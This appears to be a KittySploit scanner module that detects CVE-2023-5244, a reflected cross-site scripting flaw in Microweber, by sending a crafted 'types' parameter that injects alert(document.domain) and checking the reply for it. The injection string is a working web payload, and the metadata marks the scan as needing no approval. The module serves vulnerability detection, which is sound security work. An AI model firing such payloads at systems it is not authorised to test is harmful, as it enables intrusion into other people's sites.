#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reflected Cross-Site Scripting Vulnerability in types GET parameter on the /editor_tools/rte_image_editor endp."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microweber < V.2.0 - Cross-Site Scripting Detection',
        'description': 'Reflected Cross-Site Scripting Vulnerability in types GET parameter on the /editor_tools/rte_image_editor endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'huntr', 'xss', 'microweber', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/a3bd58ba-ca59-4cba-85d1-799f73a76470/',
            'https://vuldb.com/?id.240778',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-5244',
            'https://github.com/microweber/microweber/commit/1cb846f8f54ff6f5c668f3ae64dd81740a7e8968',
            'https://huntr.dev/bounties/a3bd58ba-ca59-4cba-85d1-799f73a76470',
        ],
        'cve': 'CVE-2023-5244',
    }

    def run(self):
        r = self.http_request(method="GET", path='/editor_tools/rte_image_editor?types=%27;});alert(document.domain);$(picker).on(%27Noodles%27,%20function(result)%20{%20var%20XSS=%27', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('alert(document.domain)', 'microweber',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Microweber < V.2.0 - Cross-Site Scripting detected",
                path='/editor_tools/rte_image_editor?types=%27;});alert(document.domain);$(picker).on(%27Noodles%27,%20function(result)%20{%20var%20XSS=%27',
            )
            return True
        return False

